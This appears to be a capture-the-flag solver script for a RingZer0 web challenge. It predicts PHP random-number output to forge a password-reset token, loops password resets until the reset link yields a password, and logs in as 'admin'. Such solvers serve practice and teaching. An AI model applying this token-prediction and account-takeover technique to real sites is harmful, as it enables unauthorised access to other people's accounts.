#!/usr/bin/env python
# -*- coding: utf-8 -*-
import ringzer0
import sys, time
from subprocess import check_output

def ch120():
	ringzer0.output('creating token')
	token = ''
	for i in range(0, 16):
		output = check_output(['./php-xrandom', '0', str(i), '0', '0']).strip()
		for line in output.split('\n'):
			rtype, rvalue = line.split(':')
			rtype, rvalue = rtype.strip(), rvalue.strip()
			if rtype != 'linux.rand.64':
				continue
			d = int(rvalue) % 10
			token += str(d)
			break
	ringzer0.output('token', token)
	
	ch, s = 120, ringzer0.login()
	ch_url = ringzer0.get_url('/challenges/{0}'.format(int(ch)))
	
	password = None
	for i in xrange(0, 50):
		ringzer0.output('resetting password')
		r = s.post(ch_url, data={'reset_username':''})
		response = ringzer0.get_response(r.text)
		ringzer0.output('reset #{0} => {1}'.format(i, response))
		r = s.get('{0}/?k={1}'.format(ch_url, token))
		response = ringzer0.get_response(r.text)
		if response.find('password') != -1:
			password = response
			break
		ringzer0.output('try #{0} => {1}'.format(i, response))
		time.sleep(1.75)
	if password is None:
		ringzer0.error('could not solve.')
		sys.exit(1)
	password = password.split(' ')[-1:][0]
	ringzer0.output('solved', password)
	r = s.post(ch_url, data={'username':'admin', 'password':password})
	response = ringzer0.get_response(r.text)
	ringzer0.output('response', response)

if __name__ == '__main__':
	ch120()
